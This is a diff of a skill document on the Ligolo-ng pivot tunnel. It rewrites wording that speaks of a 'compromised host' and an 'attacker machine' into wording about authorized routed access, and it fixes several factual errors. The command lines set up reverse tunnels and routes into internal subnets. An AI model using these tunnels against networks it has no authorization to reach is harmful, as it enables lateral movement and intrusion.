@@ -1,6 +1,6 @@
 ---
 name: ligolo-ng
-description: "Ligolo-ng — agent-based pivot tunnel that creates a TUN interface on the operator side: no SOCKS proxy, no port forwarding per service — the target network becomes directly routable. Use as the 2025-2026 standard replacement for chisel/ssh -D pivots when the target is Windows or you need direct socket access."
+description: "Configure Ligolo-ng agent/proxy tunnels, TUN interfaces, and routes for authorized access to a remote network. Use when applications need routed access rather than a SOCKS wrapper."
 license: MIT
 compatibility: "Go binary; agent runs on Windows/Linux/macOS x64/ARM64; proxy (operator side) on Linux/macOS/Windows. Requires TUN interface (/dev/net/tun on Linux, wintun.dll on Windows)."
 metadata:
@@ -10,37 +10,51 @@ metadata:
 
 # Ligolo-ng
 
-Agent-based pivot: a lightweight agent on the compromised host connects back to the operator's proxy, which creates a **TUN interface** — the target's internal network becomes directly routable from the operator machine. No SOCKS configuration, no per-service port forwards, no `proxychains`.
+The agent connects to an operator-side proxy. A TUN interface and explicit routes send traffic through the selected agent; applications do not need SOCKS configuration.
 
 ## Core workflow
 
 ```bash
-# Operator side (attacker machine)
-ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601
+# Linux operator: create the interface before starting the tunnel
+sudo ip tuntap add user "$(id -un)" mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+```
 
-# Target side (compromised host — Windows)
-ligolo-ng-agent.exe -connect <operator-ip>:11601 -ignore-cert
+In the proxy console, run `certificate_fingerprint`. Obtain that value from the trusted operator console, then connect the agent using the extracted binary's actual name:
 
-# Add the target network route on the operator machine
+```powershell
+.\agent.exe -connect <operator-ip>:11601 -accept-fingerprint <proxy-certificate-fingerprint>
+```
+
+In the proxy console, select the connected agent and start its tunnel:
+
+```text
+session
+tunnel_start --tun ligolo
+```
+
+```bash
+# Linux operator: route only the authorized remote subnet
 sudo ip route add 10.10.10.0/24 dev ligolo
-# Now directly: nmap 10.10.10.5, curl http://10.10.10.5:8080, impacket, etc.
+curl http://10.10.10.5:8080
 ```
 
 ## Best practice
 
-- **Interface setup per OS**: Linux — `sudo ip tuntap add user <user> mode tun ligolo` + `sudo ip link set ligolo up`. Windows — run proxy as admin (loads wintun.dll).
-- **Double pivoting**: chain agents — the second agent connects via the first's TUN (`-connect 10.10.10.5:11601` from the first pivot). Each layer adds a new TUN interface with a different name.
-- **Port forward mode** (when TUN isn't possible): `listener_add --addr 0.0.0.0:1234 --to 10.10.10.5:3389` from the interactive ligolo session.
-- Use `-ignore-cert` only in lab; on real engagements, selfcert works fine since the agent is the trust anchor.
+- **Other operator platforms**: follow the [upstream quickstart](https://docs.ligolo.ng/Quickstart/) for Windows Wintun and macOS interface/routing requirements.
+- **Listener direction**: `listener_add` listens on the agent and forwards to an address reachable from the proxy. It is not a substitute for routing arbitrary remote services through the TUN.
+- `-selfcert` creates a self-signed proxy certificate; the agent must validate its fingerprint. `-ignore-cert` disables verification and is only for isolated lab/debugging use.
 
 ## Gotchas
 
-- The agent binary is ~10 MB — on constrained targets, compress or use `ligolo-ng-agent` built with `-ldflags="-s -w"`.
-- TUN interface requires admin/root on the operator machine only (the agent runs unprivileged on the target).
-- DNS resolution does not pass through the tunnel by default — use `--dns` flag on the proxy or resolve locally before routing.
-- Loopback traffic on the target (e.g. accessing 127.0.0.1 services on the remote host) requires a local relay: `listener_add --addr 127.0.0.1:8080 --to 127.0.0.1:8080` from the ligolo session.
+- Creating interfaces and routes requires privileges on the operator machine; the agent can run unprivileged.
+- Supported traffic is TCP, UDP, and ICMP echo requests. TCP is translated into agent-side socket connections, not forwarded as raw packets.
+- Routing a subnet does not configure the operator's DNS resolver. Verify name resolution separately; the proxy has no general `--dns` option.
+- Agent-local loopback access uses the reserved `240.0.0.0/4` mapping, not a listener pointing back at the proxy. Load [local-port documentation](https://docs.ligolo.ng/Localhost/) when accessing agent-local services.
 
 ## References
 
 - Upstream: [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) (Nicolas Chatelain)
+- Load [listener documentation](https://docs.ligolo.ng/Listeners/) when an agent must accept incoming connections.
 - Companions: `chisel` (SOCKS alternative when TUN is unavailable), `socat` (manual relay), `ssh-tunneling` (SSH-based pivots)
